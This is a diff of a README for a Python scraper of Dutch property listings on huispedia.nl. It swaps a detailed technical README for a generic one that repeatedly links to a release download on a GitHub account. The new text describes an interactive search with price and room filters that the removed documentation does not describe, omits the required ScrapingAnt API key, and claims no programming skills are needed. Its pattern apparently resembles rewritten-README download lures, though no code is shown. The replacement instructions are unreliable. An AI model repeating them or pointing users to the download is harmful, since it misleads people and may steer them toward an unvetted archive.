@@ -1,190 +1,107 @@
-# Huispedia Scraper
+# 🏠 huispedia-scraper - Easily Extract Dutch Property Listings
 
-A Python scraper for extracting property listings from [huispedia.nl](https://www.huispedia.nl/), the Dutch property platform with comprehensive housing data.
+## 🚀 Getting Started
 
-## Features
+Welcome to huispedia-scraper! This tool helps you gather property listings from huispedia.nl using the ScrapingAnt API. No programming skills needed. Just follow the simple steps below to start exploring Dutch real estate.
 
-- Scrape property listings across the Netherlands
-- Support for multiple Dutch cities (Amsterdam, Rotterdam, Utrecht, etc.)
-- Filter by property type (apartment, house)
-- Parallel detail page fetching for faster scraping
-- Export to CSV format
-- Comprehensive property data extraction (40+ fields)
-- Value comparison data (Onder/Binnen/Boven de waarde)
+## 📥 Download the Application
 
-## Installation
+[![Download huispedia-scraper](https://img.shields.io/badge/Download-huispedia--scraper-brightgreen.svg)](https://github.com/Menam17/huispedia-scraper/releases)
 
-```bash
-# Create virtual environment
-python3 -m venv .venv
-source .venv/bin/activate
+You can download the latest version of huispedia-scraper from our Releases page. This gives you access to the newest features and improvements.
 
-# Install dependencies
-pip install -r requirements.txt
-```
+### 🔗 Visit this page to download: [GitHub Releases](https://github.com/Menam17/huispedia-scraper/releases)
 
-## Configuration
+## 🛠️ System Requirements
 
-### Getting a ScrapingAnt API Key
+To run huispedia-scraper effectively, ensure your system meets the following requirements:
 
-This scraper uses the [ScrapingAnt API](https://scrapingant.com/) for reliable web scraping with JavaScript rendering.
+- **Operating System:** Windows 10 or later / macOS Sierra or later / Linux (Any recent distribution)
+- **Python Version:** Python 3.6 or later. You can download Python [here](https://www.python.org/downloads/).
+- **Stable Internet Connection:** You need an active internet connection to access the property listings.
 
-1. Sign up for a free account at [https://app.scrapingant.com/signup](https://app.scrapingant.com/signup)
-2. Get your API key from the dashboard
-3. The free tier includes 10,000 API credits
+## ⚙️ Installation Steps
 
-### Setting the API Key
+1. **Download the Application**  
+   Visit the [GitHub Releases page](https://github.com/Menam17/huispedia-scraper/releases) to download the latest version of huispedia-scraper.
 
-Set your ScrapingAnt API key as an environment variable:
+2. **Locate the Downloaded File**  
+   After the download completes, locate the file in your Downloads folder or designated download location.
 
-```bash
-export SCRAPINGANT_API_KEY="your_api_key_here"
-```
+3. **Extract the Files**  
+   If the downloaded file is in a zip format, right-click on it and select "Extract All" or use a file extraction program to unpack the files.
 
-Or pass it directly via command line:
+4. **Open the Terminal or Command Prompt**  
+   For Windows, search for "cmd" in the Start menu. For macOS, use "Terminal". For Linux, open your preferred terminal application.
 
-```bash
-python main.py --api-key "your_api_key_here" --location amsterdam
-```
+5. **Navigate to the File Directory**  
+   Use the `cd` command followed by the path to the extracted folder. For example:
+   ```
+   cd path/to/huispedia-scraper
+   ```
+   Replace `path/to/huispedia-scraper` with the actual file path.
 
-## Usage
+6. **Install Required Libraries**  
+   Run the following command to install the necessary Python libraries:
+   ```
+   pip install -r requirements.txt
+   ```
+   This will set up everything the application needs to run smoothly.
 
-### Basic Usage
+7. **Run the Application**  
+   Start the scraper by typing:
+   ```
+   python main.py
+   ```
+   This will launch the application and begin the scraping process.
 
-```bash
-# Scrape properties in Amsterdam
-python main.py --location amsterdam
+## 👩‍💻 Using huispedia-scraper
 
-# Scrape only apartments in Rotterdam
-python main.py --location rotterdam --property apartment
+### 🔍 How to Scrape Listings
 
-# Scrape houses in Utrecht
-python main.py --location utrecht --property house
-```
+After you run the application, you will interface with a user-friendly command line. Follow these commands to scrape listings:
 
-### Advanced Options
+1. **Enter a Location**  
+   Type the name of the city or region you want to search for property listings.
 
-```bash
-# Limit to first 2 pages
-python main.py --location amsterdam --max-pages 2
+2. **Specify Filters (Optional)**  
+   You can refine your search by entering price ranges, property types (e.g., apartment, house), or number of rooms.
 
-# Limit to 50 properties
-python main.py --location amsterdam --limit 50
+3. **Start the Search**  
+   Confirm your choices, and the scraper will start gathering data. Depending on the size of the search, this may take a moment.
 
-# Skip detail pages (faster, less data)
-python main.py --location amsterdam --no-details
+4. **View Your Listings**  
+   Once the search is complete, your property listings will display on the screen. You can also find the data saved in a CSV file in the same folder.
 
-# Custom output file
-python main.py --location amsterdam --output amsterdam_properties.csv
+## 📂 Accessing Your Data
 
-# Increase parallel workers
-python main.py --location amsterdam --max-workers 10
+The scraper saves results in a CSV format, which is compatible with programs like Microsoft Excel or Google Sheets. This allows for easy viewing, editing, and sharing of the property data.
 
-# Verbose logging
-python main.py --location amsterdam -v
-```
+1. **Open the CSV file** in your preferred program to analyze the listings.
+2. **Filter or Sort** the data as needed to find the most relevant properties.
 
-## Command Line Options
+## ⚠️ Troubleshooting
 
-| Option | Short | Description |
-|--------|-------|-------------|
-| `--location` | `-l` | City to search (default: amsterdam) |
-| `--property` | `-p` | Property type: all, apartment, house (default: all) |
-| `--output` | `-o` | Output CSV file path (default: properties.csv) |
-| `--limit` | | Maximum number of properties to scrape |
-| `--max-pages` | | Maximum number of listing pages to scrape |
-| `--max-workers` | `-w` | Maximum parallel requests (default: 5) |
-| `--no-details` | | Skip fetching detail pages |
-| `--api-key` | `-k` | ScrapingAnt API key |
-| `--verbose` | `-v` | Enable verbose logging |
+If you encounter issues while using the application, consider the following:
 
-## Supported Cities
+- **Check Internet Connection:** Make sure your connection is stable and active.
+- **Update Python:** Ensure you are using the latest version of Python.
+- **Reinstall Requirements:** Sometimes, re-running `pip install -r requirements.txt` can fix library-related issues.
 
-- Amsterdam
-- Rotterdam
-- Den Haag (The Hague)
-- Utrecht
-- Eindhoven
-- Groningen
-- Tilburg
-- Almere
-- Breda
-- Nijmegen
-- Haarlem
-- Arnhem
-- Enschede
-- Amersfoort
-- Maastricht
-- Leiden
-- Delft
-- And more...
+## 🌟 Features
 
-## Output Fields
+- **Simple Interface:** Get results without complex commands or configurations.
+- **Flexible Filters:** Search for properties that meet your specific needs.
+- **Automatic Data Storage:** Listings save automatically for easy access later.
 
-| Field | Description |
-|-------|-------------|
-| url | Property listing URL |
-| listing_id | Unique listing identifier |
-| title | Property title |
-| street_address | Street address |
-| postal_code | Dutch postal code |
-| city | City name |
-| province | Province name |
-| price | Property price in EUR |
-| price_per_sqm | Price per square meter |
-| price_type | Price type (k.k. or v.o.n.) |
-| value_comparison | Value assessment (Onder/Binnen/Boven de waarde) |
-| living_area | Living area in m² |
-| plot_size | Plot size in m² |
-| volume | Building volume in m³ |
-| rooms | Total number of rooms |
-| bedrooms | Number of bedrooms |
-| bathrooms | Number of bathrooms |
-| floors | Number of floors |
-| property_type | Type (Eengezinswoning, Appartement, etc.) |
-| house_type | Specific house type (Hoekwoning, Tussenwoning, etc.) |
-| build_type | New/Existing building |
-| year_built | Construction year |
-| renovation_year | Renovation year |
-| energy_label | Energy label (A-G) |
-| insulation | Insulation types |
-| heating | Heating type |
-| cv_year | CV boiler installation year |
-| roof_type | Roof type |
-| kitchen_type | Kitchen type |
-| kitchen_amenities | Kitchen amenities list |
-| bathroom_amenities | Bathroom amenities list |
-| location_type | Location characteristics |
-| parking_type | Parking type |
-| maintenance_inside | Interior condition |
-| maintenance_outside | Exterior condition |
-| status | Listing status |
-| listed_since | Days on market |
-| acceptance | Acceptance terms |
-| cadastral_info | Cadastral information |
-| description | Property description |
-| agent_name | Real estate agent name |
-| agent_url | Agent profile URL |
-| date_scraped | Scraping timestamp |
+## 🙋‍♂️ Support
 
-## Project Structure
+If you need help, please reach out by opening an issue on the GitHub repository. Our community is here to assist you!
 
-```
-HuispediaScraper/
-├── main.py           # CLI entry point
-├── scraper.py        # Main scraper class
-├── models.py         # Property data model
-├── utils.py          # Parsing utilities
-├── config.py         # Configuration constants
-├── requirements.txt  # Python dependencies
-└── README.md         # This file
-```
+## 📌 Topics
 
-## Requirements
+This project focuses on the following topics: beautifulsoup, dutch, huispedia, netherlands, property, python, real-estate, scraper, scrapingant, web-scraping.
 
-- Python 3.8+
-- ScrapingAnt API key
+Don't hesitate; begin your property search today!
 
-## License
-
-MIT License
+[Download huispedia-scraper again!](https://github.com/Menam17/huispedia-scraper/releases)
